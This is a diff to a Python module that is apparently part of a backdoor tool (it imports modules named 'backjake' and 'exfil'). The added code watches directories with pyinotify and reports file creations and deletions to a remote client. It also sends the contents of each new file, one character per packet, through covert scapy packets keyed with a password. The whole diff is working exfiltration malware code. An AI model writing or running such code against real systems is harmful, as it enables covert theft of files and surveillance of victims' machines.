@@ -1,38 +1,78 @@
 import pyinotify
+import socket
+from subprocess import Popen, PIPE
+from scapy.all import *
+from struct import *
+import sys
+import os
 import threading
+import pcapy
+import config
+import recvFunctions
+import backjake
+import utils
+import exfil
 
 client = ""
-
+string = ""
+proto = ""
 
 class EventHandler(pyinotify.ProcessEvent):
 	def process_IN_CREATE(self, event):
-		print "Created: ", event.pathname
+		global string
+		isFile = os.path.isfile(event.pathname)
+		if isFile:
+			string = "Created file: " + event.pathname
+		else:
+			string = "Created Directory: " + event.pathname
+		sendMessage(string)
+		string = ""
+
+		if isFile:
+			sendFile(event.pathname)
+		# send this to client
 
 	def process_IN_DELETE(self, event):
-		print "Deleted: ", event.pathname
+		global string
+		sendMessage(string)
+		string = "Deleted: " + event.pathname
+		# send this to client
 
 mask = pyinotify.IN_DELETE | pyinotify.IN_CREATE
 handler = EventHandler()
 wama = pyinotify.WatchManager()
-noti = pyinotify.Notifier(wama, handler)
+noti = pyinotify.Notifier(wama, handler)	
 
-def addWatch(target):
-	# print target# check if positive for success
+def addWatch(target, address, proto):
+	global client, protocol
+	client = address
+	protocol = proto
+
 	if (wama.add_watch(target, mask, rec=True) > 0):
 		print "added: " + target
 
+def sendMessage(string):
+	# encrypt results 
+	for c in string:
+		send(utils.covertPacket(client, protocol, c, recvFunctions.pswd), verbose=0)
+	send(utils.covertPacket(client, protocol, '\n', recvFunctions.pswd), verbose=0)
+
 def removeWatch(target):
-	# print target # check if True on success
 	if (wama.rm_watch(wama.get_wd(target))):
 		print "removed: " + target
 
 def sendFile(target):
-	print target
+	with open(target, 'r') as f:
+		while True:
+			c = f.read(1)
+			if not c:
+				break
+			send(utils.covertPacket(client, protocol, c, recvFunctions.pswd), verbose=0)
 
 def exfilThread():
 	noti.loop()
 
 def startThread(): # address, protocol, password):
-	listenThread = threading.Thread(target=exfilThread) #, args=(address, protocol, password))
+	listenThread = threading.Thread(target=exfilThread)#, args=(address, protocol))
 	listenThread.daemon = True
 	listenThread.start()
